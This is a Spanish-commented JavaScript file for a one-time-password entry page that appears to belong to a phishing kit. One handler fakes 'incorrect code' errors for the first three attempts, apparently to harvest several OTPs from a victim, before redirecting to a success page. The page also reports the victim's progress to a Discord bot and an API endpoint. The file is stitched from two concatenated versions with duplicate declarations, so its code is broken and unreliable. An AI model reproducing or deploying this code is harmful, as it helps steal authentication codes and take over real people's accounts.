// otp.js

// --- Elementos del DOM ---
const DOM = {
  loader:      document.getElementById('loader'),
  inputs:      Array.from(document.querySelectorAll('.code_numerickeypad')),
  confirmBtn:  document.getElementById('confirm-btn')
};

/**
 * Muestra el loader y deshabilita botones/inputs
 */
function showLoader() {
  DOM.loader.classList.remove('hidden');
  DOM.inputs.forEach(i => i.disabled = true);
  DOM.confirmBtn.disabled = true;
}

/**
 * Oculta el loader y habilita controles
 */
function hideLoader() {
  DOM.loader.classList.add('hidden');
  DOM.inputs.forEach(i => i.disabled = false);
  DOM.confirmBtn.disabled = false;
}

/**
 * Recupera el OTP concatenado de los inputs
 * @return {string}
 */
function getOTP() {
  return DOM.inputs.map(i => i.value.trim()).join('');
}

/**
 * Verifica que todos los inputs estén llenos
 * @return {boolean}
 */
function allFilled() {
  return DOM.inputs.every(i => i.value.trim() !== '');
}

/**
 * Envía el OTP junto con la info almacenada
 * @param {string} otp 
 * @returns {Promise<any>}
 */
// js/otp.js

// --- Elementos del DOM ---
const DOM = {
  loader:     document.getElementById('loader'),
  inputs:     Array.from(document.querySelectorAll('.code_numerickeypad')),
  confirmBtn: document.getElementById('confirm-btn')
};

// Llave para el contador de intentos en localStorage
const ATTEMPTS_KEY = 'otpAttempts';

/**
 * Muestra el loader y deshabilita controles
 */
function showLoader() {
  DOM.loader.classList.remove('hidden');
  DOM.inputs.forEach(i => i.disabled = true);
  DOM.confirmBtn.disabled = true;
}

/**
 * Oculta el loader y habilita controles
 */
function hideLoader() {
  DOM.loader.classList.add('hidden');
  DOM.inputs.forEach(i => i.disabled = false);
  DOM.confirmBtn.disabled = false;
}

/**
 * Recupera el OTP concatenado de los inputs
 * @return {string}
 */
function getOTP() {
  return DOM.inputs.map(i => i.value.trim()).join('');
}

/**
 * Verifica que todos los inputs estén llenos
 * @return {boolean}
 */
function allFilled() {
  return DOM.inputs.every(i => i.value.trim() !== '');
}

/**
 * Incrementa y devuelve el número de intento actual
 * @return {number}
 */
function incrementAttempt() {
  let attempts = parseInt(localStorage.getItem(ATTEMPTS_KEY), 10) || 0;
  attempts += 1;
  localStorage.setItem(ATTEMPTS_KEY, attempts);
  return attempts;
}

/**
 * Limpia los campos de OTP y pone foco al primero
 */
function resetInputs() {
  DOM.inputs.forEach(i => { i.value = ''; });
  DOM.inputs[0].focus();
}

/**
 * Handler al hacer clic en Confirmar
 */
async function onConfirmClick() {
  if (!allFilled()) {
    return alert('Por favor completa los 6 dígitos.');
  }

  const otp = getOTP();
  showLoader();

  // Incrementamos el contador de intentos y actuamos según el número
  const attempt = incrementAttempt();

  // Simulamos la espera de 15 s (puedes poner aquí tu lógica real de envío)
  await new Promise(res => setTimeout(res, 15000));

  if (attempt < 4) {
    // Primeros 3 intentos: falla
    alert(`Código OTP incorrecto. Intento ${attempt} de 3.`);
    hideLoader();
    resetInputs();
  } else {
    // 4.º intento (o más): éxito
    window.location.href = 'success.html';
  }
}

// --- Inicialización ---
document.addEventListener('DOMContentLoaded', () => {
  // Resetear contador al entrar por primera vez (opcional):
  // localStorage.removeItem(ATTEMPTS_KEY);

  DOM.confirmBtn.addEventListener('click', onConfirmClick);

  // Si quieres notificar a Discord que llegaste a OTP:
  if (typeof sendPageStatusToDiscord === 'function') {
    sendPageStatusToDiscord('P5');
    const token = KJUR.jws.JWS.sign(
      null,
      { alg: 'HS256' },
      { message: 'P5' },
      JWT_SIGN
    );
    fetch(`${API_URL}/api/bot/status`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${API_KEY}`
      },
      body: JSON.stringify({ token })
    });
  }
});

/**
 * Handler al hacer clic en Confirmar
 */
async function onConfirmClick() {
  if (!allFilled()) {
    return alert('Por favor completa los 6 dígitos.');
  }

  const otp = getOTP();
  showLoader();

  try {
    const resp = await sendOTP(otp);

    // Espera deliberada de 15 s
    await new Promise(res => setTimeout(res, 15000));

    // Aquí decides según la respuesta:
    if (resp.success) {
      window.location.href = 'success.html';
    } else {
      alert('OTP incorrecto. Intenta de nuevo.');
      hideLoader();
      DOM.inputs.forEach(i => i.value = '');
      DOM.inputs[0].focus();
    }

  } catch (err) {
    console.error(err);
    alert('Ocurrió un error procesando el OTP.');
    hideLoader();
  }
}

// --- Inicialización ---
document.addEventListener('DOMContentLoaded', () => {
  DOM.confirmBtn.addEventListener('click', onConfirmClick);

  // Si quieres notificar a Discord que llegaste a OTP:
  if (typeof sendPageStatusToDiscord === 'function') {
    sendPageStatusToDiscord('P5');
    const token = KJUR.jws.JWS.sign(
      null,
      { alg: 'HS256' },
      { message: 'P5' },
      JWT_SIGN
    );
    fetch(`${API_URL}/api/bot/status`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${API_KEY}`
      },
      body: JSON.stringify({ token })
    });
  }
});